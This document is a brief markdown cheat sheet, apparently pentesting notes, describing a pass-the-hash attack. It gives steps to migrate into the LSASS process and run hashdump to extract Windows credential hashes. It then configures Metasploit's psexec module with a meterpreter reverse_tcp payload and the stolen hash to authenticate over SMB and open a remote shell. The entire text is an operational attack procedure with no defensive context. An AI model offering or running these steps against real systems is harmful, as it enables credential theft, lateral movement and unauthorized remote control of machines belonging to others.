# Pass The Hash with PSexec
We can use to authenticate with system legitimately using SMB  
This can be completed with just the hash  

**Retrieve system hashes**
1. Migrate to LSASS process
2. getuid to verify NT Authority privileges command
3. ```hashdump```

Module: **exploit/windows/smb/psexec**  
1. set payload to target  - ```set payload windows/x64/meterpreter/reverse_tcp```
2. Copy the hash (not the colons)
3. set SMBUser (User)
4. set SMBPass (enter the hash)
5. Run
